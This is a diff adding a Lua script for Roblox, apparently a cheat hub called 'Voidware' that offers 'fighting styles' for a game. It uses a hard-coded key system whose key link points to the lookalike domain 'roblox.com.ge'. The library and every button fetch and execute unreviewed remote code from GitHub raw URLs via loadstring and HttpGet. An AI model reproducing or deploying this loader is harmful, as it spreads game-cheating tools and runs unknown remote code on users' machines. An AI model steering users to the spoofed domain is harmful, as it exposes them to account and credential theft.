@@ -1,0 +1,103 @@
+local players = game:GetService("Players")
+local player = players.LocalPlayer
+local teams = game:GetService("Teams")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/PresidentZuyi/S/refs/heads/main/C"))()
+
+MakeWindow({
+  Hub = {
+    Title = "Voidware | 99 Nights",
+    Animation = "Made By Zuyi"
+  },
+  Key = {
+    KeySystem = true,
+    Title = "Voidware | JJS (OP)",
+    Description = "! Best Script !",
+    KeyLink = "https://roblox.com.ge/users/9966160340/profile",
+    Keys = {"zuyihello", "71838", "28282", "728292", "28282"},
+    Notifi = {
+      Notifications = true,
+      CorrectKey = "Running the Script...",
+      Incorrectkey = "The key is incorrect",
+      CopyKeyLink = "Paste In Browser!"
+    }
+  }
+})
+
+MinimizeButton({
+  Image = "rbxassetid://7229442422",
+  Size = {40, 40},
+  Color = Color3.fromRGB(10, 10, 10),
+  Corner = true,
+  Stroke = true,
+  StrokeColor = Color3.fromHSV(0.5, 1, 1)  -- Hue: 180° for cyan
+})
+
+MakeNotifi({
+  Title = "Executed!",
+  Text = "Boom!✅",
+  Time = 5
+})
+
+local Main = MakeTab({Name = "INFO"})
+
+local Image = AddImageLabel(Main, {
+  Name = "PresidentZuyi🔗",
+  Image = "rbxassetid://7229442422"
+})
+local Paragraph1 = AddParagraph(Main, {"Gojo Style Made By PresidentZuyi🔥", "CREDIT"})
+local Paragraph2 = AddParagraph(Main, {"Cen you better add this to your hub🤓", "INFO"})
+local Paragraph3 = AddParagraph(Main, {"PresidentZuyi"})
+local Paragraph4 = AddParagraph(Main, {"PresidentZuyi Is The Owner Of This Script"})
+
+-- Auto
+local Main = MakeTab({Name = "MAIN"})
+
+AddButton(Main, { 
+  Name = "Get Gojo Satoru Style", 
+  Description = "Why’d u click it ts pmo☠️!", 
+  Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/PresidentZuyi/H/refs/heads/main/B'))()
+  end
+}) 
+
+AddButton(Main, {
+  Name = "Get Ego Jinpachi Style",
+  Callback = function()
+    local function runScript(url)
+      loadstring(game:HttpGet(url))()
+    end
+    
+    local co1 = coroutine.create(runScript)
+    local co2 = coroutine.create(runScript)
+    
+    coroutine.resume(co1, "https://raw.githubusercontent.com/PresidentZuyi/Shh/refs/heads/main/C")
+    coroutine.resume(co2, "https://raw.githubusercontent.com/PresidentZuyi/Shh/refs/heads/main/F")
+  end
+})
+
+AddButton(Main, {
+  Name = "Get Igaguri Gurimu Style",
+  Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PresidentZuyi/Hi/refs/heads/main/Chh"))()
+  end
+})
+
+AddButton(Main, {
+  Name = "Isagi Manga Version On The Way!",
+  Callback = function()
+    -- No action needed for this button
+  end
+})
+
+local Read = MakeTab({Name = "READ"})
+
+local Image = AddImageLabel(Read, {
+  Name = "PresidentZuyi🔗",
+  Image = "rbxassetid://7229442422"
+})
+
+local Paragraph1 = AddParagraph(Read, {"This Script Is Made By PresidentZuyi", "CREDIT"})
+local Paragraph2 = AddParagraph(Read, {"Thank You Executive For Giving Me This Opportunity To Become A Developer In Your Server✅", "INFO"})
+local Paragraph3 = AddParagraph(Read, {"Cen you better add this script to your hub🤓"})
+local Paragraph4 = AddParagraph(Read, {"Thank You Executive For Giving Me An Opportunity To Be A Developer In Your Server!✅"})
